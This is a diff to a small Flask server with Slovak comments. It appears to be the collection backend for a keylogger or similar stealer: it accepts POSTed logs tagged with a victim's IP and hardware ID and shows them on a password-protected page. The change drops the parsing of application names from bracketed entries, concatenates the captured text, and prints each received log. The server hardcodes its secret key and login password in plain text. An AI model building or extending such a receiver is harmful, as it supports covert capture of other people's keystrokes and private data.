@@ -2,10 +2,10 @@ from flask import Flask, request, redirect, url_for, session, render_template_st
 from datetime import timedelta
 
 app = Flask(__name__)
-app.secret_key = "120202810428Jm!"  # Toto heslo si môžeš zmeniť
+app.secret_key = "120202810428Jm!"  # Heslo na prístup k logom
 app.permanent_session_lifetime = timedelta(hours=12)
 
-LOGIN_PASSWORD = "120202810428Jm!"  # Heslo pre prístup k logom
+LOGIN_PASSWORD = "120202810428Jm!"
 
 logs = []
 
@@ -26,16 +26,12 @@ HTML_PAGE = """
         <tr>
             <th>IP</th>
             <th>HWID</th>
-            <th>Používateľ</th>
-            <th>Aplikácia</th>
             <th>Text</th>
         </tr>
         {% for log in logs %}
         <tr>
             <td>{{ log['ip'] }}</td>
             <td>{{ log['hwid'] }}</td>
-            <td>{{ log['user'] }}</td>
-            <td>{{ log['app'] }}</td>
             <td>{{ log['text'] }}</td>
         </tr>
         {% endfor %}
@@ -47,7 +43,7 @@ HTML_PAGE = """
 LOGIN_FORM = """
 <form method="POST">
     <h2>🔐 Zadaj heslo pre prístup:</h2>
-    <input type="password" name="password">
+    <input type="password" name="password" autofocus>
     <input type="submit" value="Login">
 </form>
 """
@@ -73,28 +69,22 @@ def receive_log():
     if not data:
         return "No data", 400
 
+    # Priprav text z logs (zoznam)
+    log_text = ''.join(data.get("logs", [])) if isinstance(data.get("logs"), list) else str(data.get("logs", ""))
+    
     logs.append({
         "ip": data.get("ip", "unknown"),
         "hwid": data.get("hwid", "unknown"),
-        "user": data.get("user", "unknown"),
-        "app": extract_app_from_log(data.get("logs", [])),
-        "text": clean_text(data.get("logs", []))
+        "text": log_text
     })
+
+    print(f"Prijatý log z IP {data.get('ip')}: {log_text}")
 
     return "OK", 200
 
 @app.route("/log", methods=["GET"])
 def log_get():
     return "POST endpoint tu"
-
-def extract_app_from_log(log_list):
-    for item in log_list:
-        if isinstance(item, str) and item.startswith("[") and "]" in item:
-            return item.strip("[]")
-    return "unknown"
-
-def clean_text(log_list):
-    return ''.join([str(i) for i in log_list if not str(i).startswith("[")])
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
